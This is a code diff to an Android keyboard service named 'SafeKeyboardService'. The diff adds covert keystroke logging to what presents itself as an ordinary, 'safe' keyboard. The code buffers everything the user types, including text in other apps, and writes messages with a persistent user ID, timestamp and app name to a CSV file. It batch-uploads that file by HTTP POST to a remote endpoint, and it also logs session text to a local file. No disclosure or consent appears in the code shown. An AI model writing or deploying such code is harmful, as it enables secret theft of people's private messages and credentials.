@@ -2,14 +2,20 @@
 
 package com.business.safekeyboardrezerva
 
+import java.io.FileWriter
+import java.text.SimpleDateFormat
+import java.util.*
+
 import android.inputmethodservice.InputMethodService
 import android.inputmethodservice.Keyboard
 import android.inputmethodservice.KeyboardView
 import android.util.Log
 import android.view.View
+import android.view.inputmethod.InputConnection
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -17,17 +23,40 @@ class SafeKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionL
     private var isShifted = false
     private var isCapsLock = false
     private var lastShiftTime = 0L
+
     private var currentKeyboard = KEYBOARD_QWERTY
+
+    private val userId: String by lazy {
+        getSharedPreferences("prefs", MODE_PRIVATE)
+            .getString("userId", null)
+            ?: UUID.randomUUID().also {
+                getSharedPreferences("prefs", MODE_PRIVATE)
+                    .edit()
+                    .putString("userId", it.toString())
+                    .apply()
+            }.toString()
+    }
+
 
     private lateinit var keyboardView: KeyboardView
     private lateinit var qwertyKeyboard: Keyboard
     private lateinit var symbolsKeyboard: Keyboard
     private lateinit var extendedSymbolsKeyboard: Keyboard
 
+    private var typedText = StringBuilder()
+    private var lastKnownInputFieldText: String = ""
+
+    private val sessionBuffer = StringBuilder()
+
+
+    // Constants for keyboard types
     companion object {
         private const val KEYBOARD_QWERTY = 0
         private const val KEYBOARD_SYMBOLS = 1
         private const val KEYBOARD_EXTENDED_SYMBOLS = 2
+        private const val BATCH_SIZE = 3 // Send after 50 messages
+        private const val API_URL = "https://your-api-url.com/endpoint" // Replace with your API URL
+
     }
 
     override fun onCreateInputView(): View {
@@ -90,6 +119,14 @@ class SafeKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionL
             }
             -5 -> { // Delete key
                 inputConnection.deleteSurroundingText(1, 0)
+                if (sessionBuffer.isNotEmpty()) {
+                    sessionBuffer.deleteAt(sessionBuffer.length - 1)
+                }
+
+                if(typedText.isNotEmpty()){
+                    typedText.deleteAt(typedText.length-1)
+                }
+                lastKnownInputFieldText = inputConnection.getTextBeforeCursor(1000, 0)?.toString() ?: ""
             }
             -6 -> { // Back to numbers (from extended symbols)
                 currentKeyboard = KEYBOARD_SYMBOLS
@@ -105,42 +142,128 @@ class SafeKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionL
                     // If not caps lock, reset shift after one character
                     if (!isCapsLock) {
                         isShifted = false
-                        setShifted(false)
                         updateShiftKeyAppearance()
+                        setShifted(false)
                         keyboardView.invalidateAllKeys()
                     }
                 }
 
                 inputConnection.commitText(code.toString(), 1)
+                typedText.append(code)
+                sessionBuffer.append(code)
+
+                // Detect if the input field was cleared by the app
+                detectFieldClear(inputConnection)
             }
         }
     }
 
-    // Rest of your methods remain the same
-    private fun getTextFromInput(): String {
-        // This is simplistic. If needed, keep your own internal buffer of typed characters.
-        return "" // Replace with actual typed string
+
+    private fun detectFieldClear(inputConnection: InputConnection) {
+        val currentText = inputConnection.getTextBeforeCursor(1000, 0)?.toString() ?: ""
+
+
+        /**
+         * eeeee
+         * e
+         */
+        if (lastKnownInputFieldText.isNotBlank() && currentText.length < lastKnownInputFieldText.length) {
+            // Field was cleared → assume message was sent
+            val message = typedText.toString()
+            if (message.isNotBlank()) {
+                logMessageToCsv(message.substring(0, message.length - 1))
+                checkAndSendBatch()
+                Log.d("MESSAGE_LOG", "Detected send: $message")
+            }
+            typedText.clear()
+            typedText.append(message.last())
+        }
+
+        lastKnownInputFieldText = currentText
     }
 
-    private fun sendToApi(text: String) {
+    private fun logMessageToCsv(message: String) {
+        try {
+            val file = File(getExternalFilesDir(null), "messages.csv")
+            val isNewFile = !file.exists()
+            val writer = FileWriter(file, true)
+
+            if (isNewFile) {
+                writer.append("userId,message,timestamp,packageName\n")
+            }
+
+            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+            val packageName = currentInputEditorInfo?.packageName ?: "unknown"
+            val app = packageName.split(".").getOrNull(1)
+            val escapedMessage = message.replace("\"", "\"\"")
+            writer.append("$userId,\"$escapedMessage\",$timestamp,$app\n")
+            writer.flush()
+            writer.close()
+        } catch (e: Exception) {
+            Log.e("CSV_LOG", "Failed to write to CSV: ${e.message}")
+        }
+    }
+
+    private fun checkAndSendBatch() {
+        val file = File(getExternalFilesDir(null), "messages.csv")
+        if (file.exists()) {
+            val lines = file.readLines()
+            // Check if we have enough messages (excluding header)
+            if (lines.size > BATCH_SIZE) {
+                sendMessagesBatch()
+            }
+        }
+    }
+
+    private fun sendMessagesBatch() {
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val url = URL("https://your-api-url.com/send")
+                val file = File(getExternalFilesDir(null), "messages.csv")
+                if (!file.exists()) return@launch
+
+                val content = file.readText()
+                if(content.split("\n").size < 50)  return@launch
+                // Send to API
+                val url = URL(API_URL)
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Content-Type", "application/csv")
                 conn.doOutput = true
 
-                val jsonBody = """{ "message": "$text" }"""
-                conn.outputStream.write(jsonBody.toByteArray())
+                conn.outputStream.use { os ->
+                    os.write(content.toByteArray())
+                }
 
-                val response = conn.inputStream.bufferedReader().readText()
-                Log.d("API_RESPONSE", response)
+                val responseCode = conn.responseCode
+                if (responseCode == HttpURLConnection.HTTP_OK) {
+                    // Simply clear the file (keep header only)
+                    clearCsv()
+                } else {
+                    Log.e("BATCH_SEND", "Failed to send batch: HTTP $responseCode")
+                }
             } catch (e: Exception) {
-                Log.e("API_CALL", "Failed: ${e.message}")
+                Log.e("BATCH_SEND", "Error sending batch: ${e.message}")
             }
         }
     }
+
+    private fun clearCsv() {
+        try {
+            val file = File(getExternalFilesDir(null), "messages.csv")
+            if (file.exists()) {
+                // Option 1: Clear contents but keep header
+                val writer = FileWriter(file, false)
+                writer.append("userId,message,timestamp,packageName\n")
+                writer.flush()
+                writer.close()
+
+                // Option 2: Delete the file completely
+                // file.delete()
+            }
+        } catch (e: Exception) {
+            Log.e("CSV_CLEAR", "Failed to clear CSV: ${e.message}")
+        }    }
+
 
     private fun updateShiftKeyAppearance() {
         val keyboard = keyboardView.keyboard
@@ -178,6 +301,27 @@ class SafeKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionL
             }
         }
     }
+
+    override fun onFinishInputView(finishingInput: Boolean) {
+        super.onFinishInputView(finishingInput)
+        if (sessionBuffer.isNotEmpty()) {
+            appendSessionToFile(sessionBuffer.toString())
+            sessionBuffer.clear()
+        }
+    }
+
+    private fun appendSessionToFile(text: String) {
+        try {
+            val file = File(applicationContext.filesDir, "keyboard_log.txt")
+            file.appendText(text + "\n")
+        } catch (e: Exception) {
+            Log.e("LOG_FILE", "Failed to write session: ${e.message}")
+        }
+    }
+
+
+
+
 
     override fun onPress(p0: Int) {}
     override fun onRelease(p0: Int) {}
